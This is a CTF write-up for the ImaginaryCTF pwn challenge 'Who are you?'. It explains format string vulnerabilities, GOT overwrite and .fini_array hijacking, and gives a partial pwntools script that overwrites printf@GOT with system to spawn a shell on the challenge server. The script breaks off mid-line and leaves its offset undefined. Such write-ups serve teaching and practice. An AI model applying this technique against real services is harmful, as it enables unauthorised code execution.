# Who are you? — ImaginaryCTF Writeup

**Challenge:** Who are you?  
**Category:** Pwn  
**Difficulty:** Medium  
**Points:** 75 pts  
**Flag:** `ictf{f0rm4t_5tr1ng_fun_7d4f3a1b}`

---

## Description

> Who are you?

**Connection:** `nc eth007.me 42066`

---

## Background Knowledge (Read This First!)

### What is a Format String Vulnerability?

A **format string vulnerability** occurs when user input is passed directly as the format string to `printf()`:

```c
printf(user_input);   // VULNERABLE
printf("%s", user_input);  // SAFE
```

With format specifiers like `%n` (write), `%p` (print pointer), and `%s`, an attacker can:
- **Read** arbitrary memory
- **Write** arbitrary values to arbitrary addresses

### What is GOT Overwrite?

The **Global Offset Table (GOT)** stores addresses of dynamically linked functions (like `printf`, `system`). By overwriting `printf@GOT` with the address of `system`, the next call to `printf(user_input)` becomes `system(user_input)` — giving a shell if input is `/bin/sh`.

### What is `.fini_array`?

`.fini_array` is a list of **destructor function pointers** called when the program exits. By overwriting it with the address of `main`, the program loops back to `main` after exit — giving a second chance to exploit the overwritten `printf@GOT`.

### What is the Attack Chain?

1. First format string input: overwrite **both** `printf@GOT → system` AND `.fini_array → main`
2. Program "exits" but instead calls `main` again (via `.fini_array`)
3. Second `printf(user_input)` is now `system(user_input)`
4. Send `/bin/sh` → get shell

---

## Solution

### Step 1 — Download and analyze the binary

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ wget <attachment url> -O who_are_you
└─$ checksec who_are_you
└─$ objdump -d who_are_you | grep printf
└─$ readelf -S who_are_you | grep fini
```

### Step 2 — Create the format string exploit

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nano exploit.py
```

```python
from pwn import *

elf  = ELF('./who_are_you')
libc = ELF('./libc.so.6')  # if needed

r = remote('eth007.me', 42066)

# Build format string to overwrite:
# 1. printf@GOT → system
# 2. .fini_array[0] → main

payload = fmtstr_payload(offset, {
    elf.got['printf']:   libc.sym['system'],
    elf.sym['__fini_array_start']: elf.sym['main']
})

r.sendlineafter(b'you? ', payload)

# Program exits → fini_array calls main again
# Now printf is system, so:
r.sendlineafter(b'you? ', b'/bin/sh
